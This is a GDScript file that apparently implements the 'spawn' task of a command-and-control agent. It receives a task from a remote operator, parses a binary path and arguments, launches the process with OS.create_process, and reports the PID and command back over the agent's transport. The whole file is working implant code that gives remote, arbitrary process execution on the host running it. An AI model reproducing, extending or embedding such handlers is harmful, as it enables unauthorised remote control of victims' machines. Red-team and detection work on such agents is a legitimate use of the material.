extends Node

func _on_tasking_spawn(transport, task):
	# {command:spawn, id:4bca52fb-2e65-48bb-86cb-83bbf9b3872f, parameters:{"command": "path to binary", "arguments": ["-alht"]}, timestamp:1646101624.903044}

	if task.has("command") and task.get("command") == "spawn" and task.has("parameters"):
		var test_json_conv = JSON.new()
		test_json_conv.parse(task.get("parameters"))
		var parameters = test_json_conv.get_data()
		var command = parameters.get("command")
		var arguments = parameters.get("arguments")
		print("executing the following command and arguments")
		print(command)
		print(arguments)
		print("")
		var pid = OS.create_process(command, arguments)

		print("")
		print(pid)
		print("")
		
		var output = "Process Created with PID: %s" % [pid]

		transport.send(
			transport.create_task_response(
				pid != -1,
				true,
				task.get("id"),
				output,
				[
					[
						"Process Create",
						command + " " + " ".join(PackedStringArray(arguments))
					]
				]
			)
		)

	else:
		print("bad shell spawn: ", task)
		# TODO: agent_response in failure cases
